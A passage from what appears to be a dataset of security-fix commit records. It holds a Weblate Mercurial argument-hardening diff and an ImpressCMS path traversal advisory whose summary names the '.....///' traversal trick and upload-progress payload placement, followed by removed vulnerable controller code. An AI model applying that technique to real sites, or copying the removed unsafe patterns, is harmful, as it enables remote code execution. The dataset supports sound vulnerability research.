+323,7 @@ def on_branch(self, branch):\\n     def configure_branch(self, branch):\\n         \"\"\"Configure repository branch.\"\"\"\\n         if not self.on_branch(branch):\\n-            self.execute([\"update\", branch])\\n+            self.execute([\"update\", \"--\", branch])\\n         self.branch = branch\\n \\n     def describe(self):\\n@@ -343,7 +343,7 @@ def describe(self):\\n     def push(self, branch):\\n         \"\"\"Push given branch to remote repository.\"\"\"\\n         try:\\n-            self.execute([\"push\", \"-b\", self.branch])\\n+            self.execute([\"push\", f\"--branch={self.branch}\"])\\n         except RepositoryException as error:\\n             if error.retcode == 1:\\n                 # No changes found\\n@@ -363,7 +363,7 @@ def cleanup(self):\\n \\n     def update_remote(self):\\n         \"\"\"Update remote repository.\"\"\"\\n-        self.execute([\"pull\", \"--branch\", self.branch])\\n+        self.execute([\"pull\", f\"--branch={self.branch}\"])\\n         self.clean_revision_cache()\\n \\n     def parse_changed_files(self, lines: List[str]) -> Iterator[str]:'}}","message_norm":"vcs: improve mercurial parameters handling\n\nmake sure that all user provided input is handled as expected.","language":"en","entities":"[('improve', 'ACTION', ''), ('user provided input', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['weblate\/vcs\/mercurial.py'])","num_files":1.0},{"index":220,"vuln_id":"GHSA-389p-fchr-q2mg","cwe_id":"{'CWE-22'}","score":9.8,"chain":"{'https:\/\/github.com\/ImpressCMS\/impresscms\/commit\/a66d7bb499faafab803e24833606028fa0ba4261'}","dataset":"osv","summary":"Path Traversal in ImpressCMS ImpressCMS before 1.4.2 allows unauthenticated remote code execution via .....\/\/\/ directory traversal in origName or imageName, leading to unsafe interaction with the CKEditor processImage.php script. The payload may be placed in PHP_SESSION_UPLOAD_PROGRESS when the PHP installation supports upload_progress.","published_date":"2022-02-15","chain_len":1,"project":"https:\/\/github.com\/ImpressCMS\/impresscms","commit_href":"https:\/\/github.com\/ImpressCMS\/impresscms\/commit\/a66d7bb499faafab803e24833606028fa0ba4261","commit_sha":"a66d7bb499faafab803e24833606028fa0ba4261","patch":"SINGLE","chain_ord":"['a66d7bb499faafab803e24833606028fa0ba4261']","before_first_fix_commit":"{'e174e84f000add55a731ffc435b8ed08b6a03d06'}","last_fix_commit":"a66d7bb499faafab803e24833606028fa0ba4261","chain_ord_pos":1.0,"commit_datetime":"12\/04\/2020, 23:48:24","message":"Prevents using submitted filenames with ..\/ for controller (#812)\n\n* Prevents using submitted filenames with ..\/ for controller\r\n\r\n* Using preg replace for better parent paths replaces\r\n\r\nCo-authored-by: Raimondas Rimkevi\u010dius (aka MekDrop) <mekdrop@impresscms.org>","author":"Raimondas Rimkevi\u010dius","comments":null,"stats":"{'additions': 643, 'deletions': 642, 'total': 1285}","files":"{'htdocs\/libraries\/icms\/ipf\/Controller.php': {'additions': 643, 'deletions': 642, 'changes': 1285, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ImpressCMS\/impresscms\/raw\/a66d7bb499faafab803e24833606028fa0ba4261\/htdocs%2Flibraries%2Ficms%2Fipf%2FController.php', 'patch': '@@ -1,642 +1,643 @@\\n-<?php\\r\\n-\\r\\n-\/**\\r\\n- * This class is responsible for providing operations to an object for managing the object\\'s manipulation\\r\\n- *\\r\\n- * @copyright\\tThe ImpressCMS Project http:\/\/www.impresscms.org\/\\r\\n- * @license\\t\\thttp:\/\/www.gnu.org\/licenses\/old-licenses\/gpl-2.0.html GNU General Public License (GPL)\\r\\n- * @category\\tICMS\\r\\n- * @package\\t\\tIpf\\r\\n- * @subpackage\\tController\\r\\n- * @since\\t\\t1.1\\r\\n- * @author\\t\\tOriginal idea by Jan Keller Pedersen <mithrandir@xoops.org> - IDG Danmark A\/S <www.idg.dk>\\r\\n- * @author\\t\\tmarcan <marcan@impresscms.org>\\r\\n- * @version\\t\\tSVN: $Id: Controller.php 11972 2012-08-26 17:49:13Z skenow $\\r\\n- * @todo\\t\\tUse language constants for messages\\r\\n- *\/\\r\\n-\\r\\n-defined(\\'ICMS_ROOT_PATH\\') or die(\"ImpressCMS root path not defined\");\\r\\n-\\r\\n-\/**\\r\\n- *\\r\\n- *\\r\\n- * @category\\tICMS\\r\\n- * @package\\t\\tIpf\\r\\n- * @subpackage\\tController\\r\\n- *\\r\\n- *\/\\r\\n-class icms_ipf_Controller {\\r\\n-\\r\\n-\\t\/** *\/\\r\\n-\\tpublic $handler;\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param $handler\\r\\n-\\t *\/\\r\\n-\\tpublic function __construct($handler) {\\r\\n-\\t\\t$this->handler=$handler;\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tobj\\t\\t$icmsObj\\r\\n-\\t *\/\\r\\n-\\tpublic function postDataToObject(&$icmsObj) {\\r\\n-\\t\\tforeach (array_keys($icmsObj->vars) as $key) {\\r\\n-\\t\\t\\t\/\/ do not post data if control is a label\\r\\n-\\t\\t\\t$control = $icmsObj->getControl($key);\\r\\n-\\t\\t\\tif (is_array($control) && isset($control[\\'name\\']) && $control[\\'name\\'] == \"label\") continue;\\r\\n-\\r\\n-\\t\\t\\tswitch ($icmsObj->vars[$key][\\'data_type\\']) {\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_IMAGE:\\r\\n-\\t\\t\\t\\t\\tif (isset($_POST[\\'url_\\' . $key]) && $_POST[\\'url_\\' . $key] !=\\'\\') {\\r\\n-\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'beforeFileUnlink\\', $icmsObj);\\r\\n-\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the beforeFileUnlink event\");\\r\\n-\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t\\t$oldFile = $icmsObj->getUploadDir(true) . $icmsObj->getVar($key, \\'e\\');\\r\\n-\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, $_POST[\\'url_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t\\tif (is_file($oldFile) ) unlink($oldFile);\\r\\n-\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'afterFileUnlink\\', $icmsObj);\\r\\n-\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the afterFileUnlink event\");\\r\\n-\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\tif (isset($_POST[\\'delete_\\' . $key]) && $_POST[\\'delete_\\' . $key] == \\'1\\') {\\r\\n-\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'beforeFileUnlink\\', $icmsObj);\\r\\n-\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the beforeFileUnlink event\");\\r\\n-\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t\\t$oldFile = $icmsObj->getUploadDir(true) . $icmsObj->getVar($key, \\'e\\');\\r\\n-\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, \\'\\');\\r\\n-\\t\\t\\t\\t\\t\\tif (is_file($oldFile) ) unlink($oldFile);\\r\\n-\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'afterFileUnlink\\', $icmsObj);\\r\\n-\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the afterFileUnlink event\");\\r\\n-\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_URLLINK:\\r\\n-\\t\\t\\t\\t\\t$linkObj = $icmsObj->getUrlLinkObj($key);\\r\\n-\\t\\t\\t\\t\\t$linkObj->setVar(\\'mid\\', $_POST[\\'mid_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t$linkObj->setVar(\\'caption\\', $_POST[\\'caption_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t$linkObj->setVar(\\'description\\', $_POST[\\'desc_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t$linkObj->setVar(\\'target\\', $_POST[\\'target_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t$linkObj->setVar(\\'url\\', $_POST[\\'url_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\tif ($linkObj->getVar(\\'url\\') != \\'\\') {\\r\\n-\\t\\t\\t\\t\\t\\t$icmsObj->storeUrlLinkObj($linkObj);\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t\/\/@todo: catch errors\\r\\n-\\t\\t\\t\\t\\t$icmsObj->setVar($key, $linkObj->getVar(\\'urllinkid\\'));\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_FILE:\\r\\n-\\t\\t\\t\\t\\tif (!isset($_FILES[\\'upload_\\' . $key][\\'name\\']) || $_FILES[\\'upload_\\' . $key][\\'name\\'] == \\'\\') {\\r\\n-\\t\\t\\t\\t\\t\\t$fileObj = $icmsObj->getFileObj($key);\\r\\n-\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'mid\\', $_POST[\\'mid_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'caption\\', $_POST[\\'caption_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'description\\', $_POST[\\'desc_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'url\\', $_POST[\\'url_\\' . $key]);\\r\\n-\\t\\t\\t\\t\\t\\tif (!($fileObj->getVar(\\'url\\') == \\'\\' && $fileObj->getVar(\\'url\\') == \\'\\' && $fileObj->getVar(\\'url\\') == \\'\\')) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$res = $icmsObj->storeFileObj($fileObj);\\r\\n-\\t\\t\\t\\t\\t\\t\\tif ($res) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, $fileObj->getVar(\\'fileid\\'));\\r\\n-\\t\\t\\t\\t\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t\/\/error setted, but no error message (to be improved)\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors($fileObj->getErrors());\\r\\n-\\t\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_STIME:\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_MTIME:\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_LTIME:\\r\\n-\\t\\t\\t\\t\\t\/\/ check if this field\\'s value is available in the POST array\\r\\n-\\t\\t\\t\\t\\tif (is_array($_POST[$key]) && isset($_POST[$key][\\'date\\'])) {\\r\\n-\\t\\t\\t\\t\\t\\t$value = strtotime($_POST[$key][\\'date\\']) + $_POST[$key][\\'time\\'];\\r\\n-\\t\\t\\t\\t\\t\/\/ in case the field is hidden, it\\'s not formated so we can simply take the value and store it\\r\\n-\\t\\t\\t\\t\\t} elseif (filter_var($_POST[$key], FILTER_VALIDATE_INT) == $_POST[$key]) {\\r\\n-\\t\\t\\t\\t\\t\\t$value = (int)$_POST[$key];\\r\\n-\\t\\t\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t\\t\\t$value = strtotime($_POST[$key]);\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t$icmsObj->setVar($key, $value);\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_URL:\\r\\n-\\t\\t\\t\\t\\tif (isset($_POST[$key])) {\\r\\n-\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, filter_var($_POST[$key], FILTER_SANITIZE_URL));\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\r\\n-\\t\\t\\t\\tcase XOBJ_DTYPE_ARRAY:\\r\\n-\\t\\t\\t\\t\\tif (is_array($_POST[$key])) {\\r\\n-\\t\\t\\t\\t\\t\\t$icmsObj->setVar($key, serialize($_POST[$key]));\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\r\\n-\\t\\t\\t\\tdefault:\\r\\n-\\t\\t\\t\\t\\t$icmsObj->setVar($key, $_POST[$key]);\\r\\n-\\t\\t\\t\\t\\tbreak;\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t}\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tobj\\t\\t$icmsObj\\tObject\\r\\n-\\t * @param\\tint\\t\\t$objectid\\r\\n-\\t * @param\\tstr\\t\\t$created_success_msg\\tMessage to display on successful creation\\r\\n-\\t * @param\\tstr\\t\\t$modified_success_msg\\tMessage to display on successful modification\\r\\n-\\t * @param\\tbool\\t$redirect_page\\t\\t\\tWhether to redirect afterwards, or not\\r\\n-\\t * @param\\tbool\\t$debug\\t\\t\\t\\t\\tWhether to display debug information, or not\\r\\n-\\t *\/\\r\\n-\\tpublic function &doStoreFromDefaultForm(&$icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page=false, $debug=false) {\\r\\n-\\t\\tglobal $impresscms;\\r\\n-\\t\\t$this->postDataToObject($icmsObj);\\r\\n-\\r\\n-\\t\\tif ($icmsObj->isNew()) {\\r\\n-\\t\\t\\t$redirect_msg = $created_success_msg;\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t$redirect_msg = $modified_success_msg;\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\t\/\/ Check if there were uploaded files\\r\\n-\\t\\t$uploaderResult = true;\\r\\n-\\t\\tif (isset($_POST[\\'icms_upload_image\\']) || isset($_POST[\\'icms_upload_file\\'])) {\\r\\n-\\t\\t\\t$uploaderObj = new icms_file_MediaUploadHandler($icmsObj->getImageDir(true), $this->handler->_allowedMimeTypes, $this->handler->_maxFileSize, $this->handler->_maxWidth, $this->handler->_maxHeight);\\r\\n-\\t\\t\\tforeach ( $_FILES as $name=>$file_array) {\\r\\n-\\t\\t\\t\\tif (isset ($file_array[\\'name\\']) && $file_array[\\'name\\'] != \"\" && in_array(str_replace(\\'upload_\\', \\'\\', $name), array_keys($icmsObj->vars))) {\\r\\n-\\t\\t\\t\\t\\tif ($uploaderObj->fetchMedia($name)) {\\r\\n-\\t\\t\\t\\t\\t\\t$uploaderObj->setTargetFileName(time() . \"_\" . $uploaderObj->getMediaName());\\r\\n-\\t\\t\\t\\t\\t\\tif ($uploaderObj->upload()) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && true;\\r\\n-\\t\\t\\t\\t\\t\\t\\t\/\/ Find the related field in the icms_ipf_Object\\r\\n-\\t\\t\\t\\t\\t\\t\\t$related_field = str_replace(\\'upload_\\', \\'\\', $name);\\r\\n-\\t\\t\\t\\t\\t\\t\\t$uploadedArray[] = $related_field;\\r\\n-\\t\\t\\t\\t\\t\\t\\t\/\/ if it\\'s a richfile\\r\\n-\\t\\t\\t\\t\\t\\t\\tif ($icmsObj->vars[$related_field][\\'data_type\\'] == XOBJ_DTYPE_FILE) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$object_fileurl = $icmsObj->getUploadDir();\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$fileObj = $icmsObj->getFileObj($related_field);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'url\\', $object_fileurl . $uploaderObj->getSavedFileName());\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'mid\\', $_POST[\\'mid_\\' . $related_field]);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'caption\\', $_POST[\\'caption_\\' . $related_field]);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$fileObj->setVar(\\'description\\', $_POST[\\'desc_\\' . $related_field]);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->storeFileObj($fileObj);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setVar($related_field, $fileObj->getVar(\\'fileid\\'));\\r\\n-\\t\\t\\t\\t\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'beforeFileUnlink\\', $icmsObj);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the beforeFileUnlink event\");\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$old_file = $icmsObj->getUploadDir(true) . $icmsObj->getVar($related_field);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\tif (is_file($old_file) ) unlink($old_file);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setVar($related_field, $uploaderObj->getSavedFileName());\\r\\n-\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t$eventResult = $this->handler->executeEvent(\\'afterFileUnlink\\', $icmsObj);\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\tif (!$eventResult) {\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors(\"An error occured during the afterFileUnlink event\");\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\r\\n-\\t\\t\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t\\t\\t\\t$icmsObj->setErrors($uploaderObj->getErrors(false));\\r\\n-\\t\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\r\\n-\\t\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t\\t\\t$icmsObj->setErrors($uploaderObj->getErrors(false));\\r\\n-\\t\\t\\t\\t\\t\\t$uploaderResult = $uploaderResult && false;\\r\\n-\\t\\t\\t\\t\\t}\\r\\n-\\t\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\tif ($uploaderResult) {\\r\\n-\\t\\t\\tif ($debug) {\\r\\n-\\t\\t\\t\\t$storeResult = $this->handler->insertD($icmsObj);\\r\\n-\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t$storeResult = $this->handler->insert($icmsObj);\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t$storeResult = false;\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\tif ($storeResult) {\\r\\n-\\t\\t\\tif ($this->handler->getPermissions()) {\\r\\n-\\t\\t\\t\\t$icmspermissions_handler = new icms_ipf_permission_Handler($this->handler);\\r\\n-\\t\\t\\t\\t$icmspermissions_handler->storeAllPermissionsForId($icmsObj->id());\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\tif ($redirect_page === null) {\\r\\n-\\t\\t\\treturn $icmsObj;\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\tif (!$storeResult) {\\r\\n-\\t\\t\\t\\tredirect_header($impresscms->urls[\\'previouspage\\'], 3, _CO_ICMS_SAVE_ERROR . $icmsObj->getHtmlErrors());\\r\\n-\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t$redirect_page = $redirect_page ? $redirect_page : icms_get_page_before_form();\\r\\n-\\t\\t\\t\\tredirect_header($redirect_page, 2, $redirect_msg);\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t}\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * Store the object in the database autmatically from a form sending POST data\\r\\n-\\t *\\r\\n-\\t * @param string $created_success_msg message to display if new object was created\\r\\n-\\t * @param string $modified_success_msg message to display if object was successfully edited\\r\\n-\\t * @param string $created_redir_page redirect page after creating the object\\r\\n-\\t * @param string $modified_redir_page redirect page after editing the object\\r\\n-\\t * @param string $redirect_page redirect page, if not set, then we backup once\\r\\n-\\t * @param bool $exit if set to TRUE then the script ends\\r\\n-\\t * @return bool\\r\\n-\\t *\/\\r\\n-\\tpublic function &storeFromDefaultForm($created_success_msg, $modified_success_msg, $redirect_page=false, $debug=false, $x_param = false) {\\r\\n-\\t\\t$objectid = ( isset($_POST[$this->handler->keyName]) )\\r\\n-\\t\\t\\t\\t? (int) $_POST[$this->handler->keyName]\\r\\n-\\t\\t\\t\\t: 0;\\r\\n-\\t\\tif ($debug) {\\r\\n-\\t\\t\\tif ($x_param) {\\r\\n-\\t\\t\\t\\t$icmsObj = $this->handler->getD($objectid, true,  $x_param);\\r\\n-\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t$icmsObj = $this->handler->getD($objectid);\\r\\n-\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\tif ($x_param) {\\r\\n-\\t\\t\\t\\t$icmsObj = $this->handler->get($objectid, true, false, false, $x_param);\\r\\n-\\t\\t\\t} else {\\r\\n-\\t\\t\\t\\t$icmsObj = $this->handler->get($objectid);\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\t\/**\\r\\n-\\t\\t * @todo multilanguage persistable handler is not fully implemented yet\\r\\n-\\t\\t *\/\\r\\n-\\r\\n-\\t\\t\/\/ if handler is the Multilanguage handler, we will need to treat this for multilanguage\\r\\n-\\t\\tif (is_subclass_of($this->handler, \\'icmspersistablemlobjecthandler\\')) {\\r\\n-\\r\\n-\\t\\t\\tif ($icmsObj->isNew()) {\\r\\n-\\t\\t\\t\\t\/\/ This is a new object. We need to store the meta data and then the language data\\r\\n-\\t\\t\\t\\t\/\/ First, we will get rid of the multilanguage data to only store the meta data\\r\\n-\\t\\t\\t\\t$icmsObj->stripMultilanguageFields();\\r\\n-\\t\\t\\t\\t$newObject =& $this->doStoreFromDefaultForm($icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page, $debug);\\r\\n-\\t\\t\\t\\t\/**\\r\\n-\\t\\t\\t\\t * @todo we need to trap potential errors here\\r\\n-\\t\\t\\t\\t *\/\\r\\n-\\r\\n-\\t\\t\\t\\t\/\/ ok, the meta daa is stored. Let\\'s recreate the object and then\\r\\n-\\t\\t\\t\\t\/\/ get rid of anything not multilanguage\\r\\n-\\t\\t\\t\\tunset($icmsObj);\\r\\n-\\t\\t\\t\\t$icmsObj = $this->handler->get($objectid);\\r\\n-\\t\\t\\t\\t$icmsObj->stripNonMultilanguageFields();\\r\\n-\\r\\n-\\t\\t\\t\\t$icmsObj->setVar($this->handler->keyName, $newObject->getVar($this->handler->keyName));\\r\\n-\\t\\t\\t\\t$this->handler->changeTableNameForML();\\r\\n-\\t\\t\\t\\t$ret =& $this->doStoreFromDefaultForm($icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page, $debug);\\r\\n-\\r\\n-\\t\\t\\t\\treturn $ret;\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\treturn $this->doStoreFromDefaultForm($icmsObj, $objectid, $created_success_msg, $modified_success_msg, $redirect_page, $debug);\\r\\n-\\t\\t}\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * Stores an object and shows debug information\\r\\n-\\t *\/\\r\\n-\\tpublic function &storeicms_ipf_ObjectD() {\\r\\n-\\t\\treturn $this->storeicms_ipf_Object(true);\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tbool\\t$debug\\r\\n-\\t * @param\\tbool\\t$xparam\\r\\n-\\t * @see\\t\\tstoreFromDefaultForm\\r\\n-\\t *\/\\r\\n-\\tpublic function &storeicms_ipf_Object($debug=false, $xparam = false) {\\r\\n-\\t\\t$ret =& $this->storeFromDefaultForm(\\'\\', \\'\\', null, $debug, $xparam);\\r\\n-\\r\\n-\\t\\treturn $ret;\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t * Handles deletion of an object which keyid is passed as a GET param\\r\\n-\\t *\\r\\n-\\t * @param string $redir_page redirect page after deleting the object\\r\\n-\\t * @return bool\\r\\n-\\t *\/\\r\\n-\\tpublic function handleObjectDeletion($confirm_msg = false, $op=\\'del\\', $userSide=false) {\\r\\n-\\t\\tglobal $impresscms;\\r\\n-\\r\\n-\\t\\t$objectid = (isset($_REQUEST[$this->handler->keyName])) ? (int) $_REQUEST[$this->handler->keyName] : 0;\\r\\n-\\t\\t$icmsObj = $this->handler->get($objectid);\\r\\n-\\r\\n-\\t\\tif ($icmsObj->isNew()) {\\r\\n-\\t\\t\\tredirect_header(\"javascript:history.go(-1)\", 3, _CO_ICMS_NOT_SELECTED);\\r\\n-\\t\\t\\texit();\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\t$confirm = ( isset($_POST[\\'confirm\\']) ) ? $_POST[\\'confirm\\'] : 0;\\r\\n-\\t\\tif ($confirm) {\\r\\n-\\t\\t\\tif (!$this->handler->delete($icmsObj)) {\\r\\n-\\t\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_ERROR . $icmsObj->getHtmlErrors());\\r\\n-\\t\\t\\t\\texit;\\r\\n-\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_SUCCESS);\\r\\n-\\t\\t\\texit();\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t\/\/ no confirm: show deletion condition\\r\\n-\\r\\n-\\t\\t\\ticms_cp_header();\\r\\n-\\r\\n-\\t\\t\\tif (!$confirm_msg) {\\r\\n-\\t\\t\\t\\t$confirm_msg = _CO_ICMS_DELETE_CONFIRM;\\r\\n-\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t\\t$hiddens = array(\\r\\n-\\t\\t\\t\\t\\t\\t\\'op\\' => $op,\\r\\n-\\t\\t\\t\\t\\t\\t$this->handler->keyName => $icmsObj->getVar($this->handler->keyName),\\r\\n-\\t\\t\\t\\t\\t\\t\\'confirm\\' => 1,\\r\\n-\\t\\t\\t\\t\\t\\t\\'redirect_page\\' => $impresscms->urls[\\'previouspage\\']\\r\\n-\\t\\t\\t);\\r\\n-\\t\\t\\tif ($this->handler->_moduleName == \\'system\\') {\\r\\n-\\t\\t\\t\\t$hiddens[\\'fct\\'] = isset($_GET[\\'fct\\']) ? $_GET[\\'fct\\'] : false;\\r\\n-\\t\\t\\t}\\r\\n-\\t\\t\\ticms_core_Message::confirm($hiddens, xoops_getenv(\\'SCRIPT_NAME\\'), sprintf($confirm_msg , $icmsObj->getVar($this->handler->identifierName)), _CO_ICMS_DELETE);\\r\\n-\\r\\n-\\t\\t\\ticms_cp_footer();\\r\\n-\\r\\n-\\t\\t}\\r\\n-\\t\\texit();\\r\\n-\\t}\\r\\n-\\r\\n-\\t\/**\\r\\n-\\t *\\r\\n-\\t * @param\\tbool\\t$confirm_msg\\r\\n-\\t * @param\\tstring\\t$op\\r\\n-\\t *\/\\r\\n-\\tpublic function handleObjectDeletionFromUserSide($confirm_msg = false, $op=\\'del\\') {\\r\\n-\\t\\tglobal $icmsTpl, $impresscms;\\r\\n-\\r\\n-\\t\\t$objectid = ( isset($_REQUEST[$this->handler->keyName]) ) ? (int) ($_REQUEST[$this->handler->keyName]) : 0;\\r\\n-\\t\\t$icmsObj = $this->handler->get($objectid);\\r\\n-\\r\\n-\\t\\tif ($icmsObj->isNew()) {\\r\\n-\\t\\t\\tredirect_header(\"javascript:history.go(-1)\", 3, _CO_ICMS_NOT_SELECTED);\\r\\n-\\t\\t\\texit();\\r\\n-\\t\\t}\\r\\n-\\r\\n-\\t\\t$confirm = ( isset($_POST[\\'confirm\\']) ) ? $_POST[\\'confirm\\'] : 0;\\r\\n-\\t\\tif ($confirm) {\\r\\n-\\t\\t\\tif (!$this->handler->delete($icmsObj)) {\\r\\n-\\t\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_ERROR . $icmsObj->getHtmlErrors());\\r\\n-\\t\\t\\t\\texit;\\r\\n-\\t\\t\\t}\\r\\n-\\r\\n-\\t\\t\\tredirect_header($_POST[\\'redirect_page\\'], 3, _CO_ICMS_DELETE_SUCCESS);\\r\\n-\\t\\t\\texit();\\r\\n-\\t\\t} else {\\r\\n-\\t\\t\\t\/\/ no confirm: show deletion condition\\r\\n-\\t\\t\\tif (!$confirm_msg) {\\r\\n-\\t\\t\\t\\t$confirm_msg = 